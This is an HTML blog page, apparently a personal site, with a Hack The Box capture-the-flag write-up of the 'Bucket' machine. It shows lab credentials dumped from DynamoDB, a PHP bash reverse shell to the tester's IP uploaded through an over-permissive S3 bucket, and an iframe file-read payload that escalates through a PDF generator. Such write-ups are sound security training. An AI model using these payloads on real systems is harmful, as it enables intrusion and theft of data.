@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Bucket Write-Up | The Cyber Experiment</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Bucket Write-Up" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is my writeup of the Bucket machine on Hack The Box. It was a fun box that introduced me to AWS S3 buckets and DynamoDB. The machine uses an S3 bucket with too wide permissions which allows an attacker to gain foothold on the machine as the www-data user by uploading a shell. Once on the machine, enumeration reveals another instance of Apache running as the root user. This Apache instance runs a web application that can be leveraged for arbitrary local file read; resulting in disclosure of the /root/root.txt flag." />
+<meta property="og:description" content="This is my writeup of the Bucket machine on Hack The Box. It was a fun box that introduced me to AWS S3 buckets and DynamoDB. The machine uses an S3 bucket with too wide permissions which allows an attacker to gain foothold on the machine as the www-data user by uploading a shell. Once on the machine, enumeration reveals another instance of Apache running as the root user. This Apache instance runs a web application that can be leveraged for arbitrary local file read; resulting in disclosure of the /root/root.txt flag." />
+<link rel="canonical" href="/htb/bucket-write-up" />
+<meta property="og:url" content="/htb/bucket-write-up" />
+<meta property="og:site_name" content="The Cyber Experiment" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-23T22:20:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Bucket Write-Up" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Bucket Write-Up","dateModified":"2021-03-23T22:20:00+01:00","datePublished":"2021-03-23T22:20:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/bucket-write-up"},"url":"/htb/bucket-write-up","description":"This is my writeup of the Bucket machine on Hack The Box. It was a fun box that introduced me to AWS S3 buckets and DynamoDB. The machine uses an S3 bucket with too wide permissions which allows an attacker to gain foothold on the machine as the www-data user by uploading a shell. Once on the machine, enumeration reveals another instance of Apache running as the root user. This Apache instance runs a web application that can be leveraged for arbitrary local file read; resulting in disclosure of the /root/root.txt flag.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Cyber Experiment" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">The Cyber Experiment</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Bucket Write-Up</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-03-23T22:20:00+01:00" itemprop="datePublished">Mar 23, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This is my writeup of the Bucket machine on Hack The Box. It was a fun box that introduced me to AWS S3 buckets and DynamoDB. The machine uses an S3 bucket with too wide permissions which allows an attacker to gain foothold on the machine as the www-data user by uploading a shell. Once on the machine, enumeration reveals another instance of Apache running as the root user. This Apache instance runs a web application that can be leveraged for arbitrary local file read; resulting in disclosure of the <code class="language-plaintext highlighter-rouge">/root/root.txt</code> flag.</p>
+
+<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
+<p>Initial scan of the host shows that port 80 is open and that the hostname of the machine is <code class="language-plaintext highlighter-rouge">bucket.htb</code>. So I add an entry to our /etc/hosts file for <code class="language-plaintext highlighter-rouge">10.10.10.212   bucket.htb</code> and proceed to enumerate the discovered web application.</p>
+
+<p>In the background I also ran a tcp scan on all ports, however this scan did not return any other open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-oA</span> nmap/tcp-version 10.10.10.212
+
+Nmap scan report <span class="k">for </span>10.10.10.212
+Host is up <span class="o">(</span>0.027s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumerating-the-web-application">Enumerating the Web Application</h2>
+<p>Browsing around on the web application does not reveal any dynamic content or parameter that might be injectable. But we do discover that the website hosts its images on a sub domain: <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code></p>
+
+<p>I decided to enumerate the main website and the sub domain by looking for hidden content. Running dirb on the main domain I found no interesting results (<code class="language-plaintext highlighter-rouge">dirb http://bucket.htb /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</code>). <code class="language-plaintext highlighter-rouge">Dirb</code> took extremely long so I used the tool <code class="language-plaintext highlighter-rouge">wfuzz</code> on the sub domain and found some hidden content.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-u</span> http://s3.bucket.htb/FUZZ <span class="se">\</span>
+      <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt <span class="se">\</span>
+      | <span class="nb">grep</span> <span class="nt">-v</span> 404 <span class="se">\</span>
+      | <span class="nb">tee </span>raft-small-words-s3.wfuzz
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://s3.bucket.htb/FUZZ
+Total requests: 38267
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                 
+<span class="o">=====================================================================</span>
+
+000001187:   200        0 L      5 W        54 Ch       <span class="s2">"health"</span>                                
+000001382:   200        0 L      0 W        0 Ch        <span class="s2">"shell"</span>                                 
+000004191:   403        9 L      28 W       278 Ch      <span class="s2">"server-status"</span>                         
+000028680:   500        0 L      13 W       158 Ch      <span class="s2">"shells"</span>                                
+
+Total <span class="nb">time</span>: 0
+Processed Requests: 38267
+Filtered Requests: 0
+Requests/sec.: 0
+</code></pre></div></div>
+
+<h2 id="dynamodb">DynamoDB</h2>
+<p>The page <code class="language-plaintext highlighter-rouge">http://s3.bucket.htb/shell/</code> (mind the last slash, without it it will not show the right page) hosts a DynamoDB shell. As I am not familiar at all with DynamoDB, however any database may contain interesting data. The menu on the page itself had an examples section. Using the found examples I listed the tables and dumped an interesting table to obtain the following credentials</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Username</th>
+      <th>Password</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Mgmt</td>
+      <td>Mangement@#1@#</td>
+    </tr>
+    <tr>
+      <td>Cloudadm</td>
+      <td>Welcome123!</td>
+    </tr>
+    <tr>
+      <td>Sysadm</td>
+      <td>n2vM-&lt;_K_Q:.Aa2 }</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>First thing I tried was see if any of the credentials worked for SSH, however I had no luck here. So lets continue our enumeration.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">ExclusiveStartTableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">table_name</span><span class="dl">'</span><span class="p">,</span> 
+<span class="p">};</span>
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nx">listTables</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span> 
+    <span class="k">else</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> 
+<span class="p">});</span>
+</code></pre></div></div>
+<p><em>Javascript snippet used to list the tables in DynamoDB.</em></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
+<span class="na">TableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">users</span><span class="dl">'</span><span class="p">,</span>
+<span class="na">Select</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ALL_ATTRIBUTES</span><span class="dl">"</span>
+<span class="p">};</span>
+
+<span class="nx">dynamodb</span><span class="p">.</span><span class="nx">scan</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span> 
+    <span class="k">else</span> <span class="nx">ppJson</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span> 
+<span class="p">});</span>
+</code></pre></div></div>
+<p><em>Javascript snippet used to dump the contents of the users table.</em></p>
+
+<h2 id="interacting-with-the-api">Interacting with the API</h2>
+<p>By visiting the http://s3.bucket.htb/server-status page, I discover that the server is running an S3 instance (what a surprise…). As I am not familiar with AWS S3 I looked up the <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/API_Operations_Amazon_Simple_Storage_Service.html">documentation</a> first to figure out how I could enumerate the bucket.</p>
+
+<p>From the documentation I learn that I can enumerate the bucket by querying its API. The first query that made sense to me was to obtain its ACL, by going to <code class="language-plaintext highlighter-rouge">http://s3.bucket.htb/adserver/?acl</code>. The ACL states that we have FULL_CONTROL permissions on the bucket. At this stage it was not yet clear how I could leverage this to gain a foothold on the machine. So I continue my enumeration</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;AccessControlPolicy&gt;</span>
+  <span class="nt">&lt;Owner&gt;</span>
+    <span class="nt">&lt;ID&gt;</span>
+      75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
+    <span class="nt">&lt;/ID&gt;</span>
+    <span class="nt">&lt;DisplayName&gt;</span>webfile<span class="nt">&lt;/DisplayName&gt;</span>
+  <span class="nt">&lt;/Owner&gt;</span>
+  <span class="nt">&lt;AccessControlList&gt;</span>
+    <span class="nt">&lt;Grant&gt;</span>
+      <span class="nt">&lt;Grantee</span> <span class="na">xsi:type=</span><span class="s">"CanonicalUser"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;ID&gt;</span>
+          75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
+        <span class="nt">&lt;/ID&gt;</span>
+      <span class="nt">&lt;/Grantee&gt;</span>
+      <span class="nt">&lt;Permission&gt;</span>FULL_CONTROL<span class="nt">&lt;/Permission&gt;</span>
+    <span class="nt">&lt;/Grant&gt;</span>
+  <span class="nt">&lt;/AccessControlList&gt;</span>
+<span class="nt">&lt;/AccessControlPolicy&gt;</span>
+</code></pre></div></div>
+<p><em>The access control policy of the adserver bucket.</em></p>
+
+<p>The next step is to obtain the contents of the bucket by visiting <code class="language-plaintext highlighter-rouge">http://s3.bucket.htb/adserver/?inventory</code>. In the output we see that the bucket contains the source code of the web application. At this point it seems that the bucket either host the web application or the web server retrieves the web application from the bucket. In any case, I proceed to investigate how I can upload a shell to the web server (remember that we have FULL_CONTROL permissions)</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;ListBucketResult</span> <span class="na">xmlns=</span><span class="s">"http://s3.amazonaws.com/doc/2006-03-01/"</span><span class="nt">&gt;</span>
+   <span class="nt">&lt;Name&gt;</span>adserver<span class="nt">&lt;/Name&gt;</span>
+   <span class="nt">&lt;MaxKeys&gt;</span>1000<span class="nt">&lt;/MaxKeys&gt;</span>
+   <span class="nt">&lt;Delimiter</span> <span class="nt">/&gt;</span>
+   <span class="nt">&lt;IsTruncated&gt;</span>false<span class="nt">&lt;/IsTruncated&gt;</span>
+   <span class="nt">&lt;Contents&gt;</span>
+      <span class="nt">&lt;Key&gt;</span>images/bug.jpg<span class="nt">&lt;/Key&gt;</span>
+      <span class="nt">&lt;LastModified&gt;</span>2021-03-26T20:45:04.000Z<span class="nt">&lt;/LastModified&gt;</span>
+      <span class="nt">&lt;ETag&gt;</span>"25118cbb11c412f4b517249e6e877dc3"<span class="nt">&lt;/ETag&gt;</span>
+      <span class="nt">&lt;Size&gt;</span>37840<span class="nt">&lt;/Size&gt;</span>
+      <span class="nt">&lt;StorageClass&gt;</span>STANDARD<span class="nt">&lt;/StorageClass&gt;</span>
+      <span class="nt">&lt;Owner&gt;</span>
+         <span class="nt">&lt;ID&gt;</span>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a<span class="nt">&lt;/ID&gt;</span>
+         <span class="nt">&lt;DisplayName&gt;</span>webfile<span class="nt">&lt;/DisplayName&gt;</span>
+      <span class="nt">&lt;/Owner&gt;</span>
+   <span class="nt">&lt;/Contents&gt;</span>
+   <span class="nt">&lt;Contents&gt;</span>
+      <span class="nt">&lt;Key&gt;</span>images/cloud.png<span class="nt">&lt;/Key&gt;</span>
+      <span class="nt">&lt;LastModified&gt;</span>2021-03-26T20:45:04.000Z<span class="nt">&lt;/LastModified&gt;</span>
+      <span class="nt">&lt;ETag&gt;</span>"4d7905acad5d78b01085e461f78eae43"<span class="nt">&lt;/ETag&gt;</span>
+      <span class="nt">&lt;Size&gt;</span>51485<span class="nt">&lt;/Size&gt;</span>
+      <span class="nt">&lt;StorageClass&gt;</span>STANDARD<span class="nt">&lt;/StorageClass&gt;</span>
+      <span class="nt">&lt;Owner&gt;</span>
+         <span class="nt">&lt;ID&gt;</span>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a<span class="nt">&lt;/ID&gt;</span>
+         <span class="nt">&lt;DisplayName&gt;</span>webfile<span class="nt">&lt;/DisplayName&gt;</span>
+      <span class="nt">&lt;/Owner&gt;</span>
+   <span class="nt">&lt;/Contents&gt;</span>
+   <span class="nt">&lt;Contents&gt;</span>
+      <span class="nt">&lt;Key&gt;</span>images/malware.png<span class="nt">&lt;/Key&gt;</span>
+      <span class="nt">&lt;LastModified&gt;</span>2021-03-26T20:45:04.000Z<span class="nt">&lt;/LastModified&gt;</span>
+      <span class="nt">&lt;ETag&gt;</span>"b22715647e087104f6b1ff7c0ce0731c"<span class="nt">&lt;/ETag&gt;</span>
+      <span class="nt">&lt;Size&gt;</span>16486<span class="nt">&lt;/Size&gt;</span>
+      <span class="nt">&lt;StorageClass&gt;</span>STANDARD<span class="nt">&lt;/StorageClass&gt;</span>
+      <span class="nt">&lt;Owner&gt;</span>
+         <span class="nt">&lt;ID&gt;</span>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a<span class="nt">&lt;/ID&gt;</span>
+         <span class="nt">&lt;DisplayName&gt;</span>webfile<span class="nt">&lt;/DisplayName&gt;</span>
+      <span class="nt">&lt;/Owner&gt;</span>
+   <span class="nt">&lt;/Contents&gt;</span>
+   <span class="nt">&lt;Contents&gt;</span>
+      <span class="nt">&lt;Key&gt;</span>index.html<span class="nt">&lt;/Key&gt;</span>
+      <span class="nt">&lt;LastModified&gt;</span>2021-03-26T20:45:04.000Z<span class="nt">&lt;/LastModified&gt;</span>
+      <span class="nt">&lt;ETag&gt;</span>"dadef349eabdda42a5ff5118a5b9c229"<span class="nt">&lt;/ETag&gt;</span>
+      <span class="nt">&lt;Size&gt;</span>5344<span class="nt">&lt;/Size&gt;</span>
+      <span class="nt">&lt;StorageClass&gt;</span>STANDARD<span class="nt">&lt;/StorageClass&gt;</span>
+      <span class="nt">&lt;Owner&gt;</span>
+         <span class="nt">&lt;ID&gt;</span>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a<span class="nt">&lt;/ID&gt;</span>
+         <span class="nt">&lt;DisplayName&gt;</span>webfile<span class="nt">&lt;/DisplayName&gt;</span>
+      <span class="nt">&lt;/Owner&gt;</span>
+   <span class="nt">&lt;/Contents&gt;</span>
+<span class="nt">&lt;/ListBucketResult&gt;</span>
+</code></pre></div></div>
+<p><em>The inventory of the adserver bucket.</em></p>
+
+<p>Consulting the docs again I find that we can use a PUT request to the API to upload any file to the bucket. So I used Burpsuite to create a request containing a reverse shell. After the upload I trigger the shell by visiting the <code class="language-plaintext highlighter-rouge">http://bucket.htb/rev-shell.php</code> page in the browser. Make sure to catch the shell using <code class="language-plaintext highlighter-rouge">nc -nlvp 9001</code>.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PUT</span> <span class="nn">/adserver/rev-shell.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">s3.bucket.htb</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">82</span>
+
+&lt;?php system("/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.134/9001 0&gt;&amp;1\"") ?&gt;
+</code></pre></div></div>
+<p><em>HTTP request for uploading the reverse shell to the S3 bucket.</em></p>
+
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<p>At this point I have shell access to the machine as the www-data user. I tried reading the user flag located at <code class="language-plaintext highlighter-rouge">/home/roy/user.txt</code>. However, I did not have permissions to read the file. Going back to the credentials we found earlier I tried to login as the user roy using <code class="language-plaintext highlighter-rouge">su</code> with the password I found for the <code class="language-plaintext highlighter-rouge">Sysadm</code> user. Alternatively we can login via SSH using <code class="language-plaintext highlighter-rouge">roy</code> as username.</p>
+
+<p>At this point, I began enumerating the machine again but using our new privileges as the roy user. I used the <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas.sh</a> script to enumerate the machine in the background while also doing some manual enumeration.</p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">ps aux | grep root</code> I found another instance of apache running as the root user. So I navigated to the <code class="language-plaintext highlighter-rouge">/var/www</code> directory and found the <code class="language-plaintext highlighter-rouge">bucket-app</code> folder that contained the <code class="language-plaintext highlighter-rouge">index.php</code> script. The line that triggered me is the line that uses the <code class="language-plaintext highlighter-rouge">passthru</code> function, which executes shell commands.</p>
+
+<p>Since it runs the <code class="language-plaintext highlighter-rouge">pd4ml_demo.jar</code> file; I googled it and quickly found that it had be exploited recently (<a href="https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd">blog post</a>). The blog post explains how the program can be used to read arbitrary files. Since it is running as the root user, this seems a good privilege escalation opportunity.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+  <span class="kn">use</span> <span class="nc">Aws\DynomoDb\DynomoDbClient</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
+      <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>
+              <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
+              <span class="s1">'region'</span> <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
+              <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span> 
+              <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
+      <span class="p">]);</span>
+
+      <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+              <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>
+              <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
+              <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>
+      <span class="p">));</span>
+
+      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
+              <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
+      <span class="p">}</span>
+      <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xms512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p><em>The <code class="language-plaintext highlighter-rouge">index.php</code> file of the bucket-app.</em></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>By reading the PHP script and the blog post, I created the following plan to obtain the <code class="language-plaintext highlighter-rouge">/root/root.txt</code> flag:</p>
+<ol>
+  <li>Create a table <code class="language-plaintext highlighter-rouge">alerts</code></li>
+  <li>Insert a payload to read a file as root</li>
+  <li>Trigger the web application to generate a report</li>
+  <li>Quickly copy the report because of aggressive cleanup on the machine</li>
+</ol>
+
+<p>I implemented these steps in the script below. Again I was still not familiar with AWS and the CLI interface it provides to interact with DynamoDB so I made heavy use of the examples provided in the <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Tools.CLI.html#Tools.CLI.UsingWithDDB">documentation</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws dynamodb create-table <span class="se">\</span>
+    <span class="nt">--table-name</span> alerts <span class="se">\</span>
+    <span class="nt">--attribute-definitions</span> <span class="se">\</span>
+        <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="se">\</span>
+        <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="se">\</span>
+    <span class="nt">--key-schema</span> <span class="se">\</span>
+        <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="se">\</span>
+        <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="se">\</span>
+    <span class="nt">--provisioned-throughput</span> <span class="se">\</span>
+        <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>5 <span class="se">\</span>
+    <span class="nt">--no-sign-request</span> <span class="nt">--region</span> <span class="s2">"us-east-1"</span> <span class="nt">--endpoint-url</span> http://localhost:4566 <span class="se">\</span>
+<span class="o">&amp;&amp;</span> aws dynamodb put-item 
+    <span class="nt">--table-name</span> alerts  <span class="se">\</span>
+    <span class="nt">--item</span> <span class="s1">'{"title": {"S": "Ransomware"}, "data": {"S": "&lt;iframe src=\"file:///root/root.txt\"&gt;&lt;/iframe&gt;"} }'</span> <span class="se">\</span>
+    <span class="nt">--no-sign-request</span> <span class="nt">--region</span> <span class="s2">"us-east-1"</span> <span class="nt">--endpoint-url</span> http://localhost:4566 <span class="se">\</span>
+<span class="o">&amp;&amp;</span> wget http://localhost:8000 <span class="nt">-O</span> - <span class="nt">--post-data</span> <span class="s2">"action=get_alerts"</span> <span class="se">\</span>
+<span class="o">&amp;&amp;</span> <span class="nb">cp </span>files/result.pdf /tmp/.
+</code></pre></div></div>
+
+<p>Now open the pdf file to read the flag :)</p>
+
+
+  </div><a class="u-url" href="/htb/bucket-write-up" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">The Cyber Experiment</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">The Cyber Experiment</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/the-cyber-experiment"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">the-cyber-experiment</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
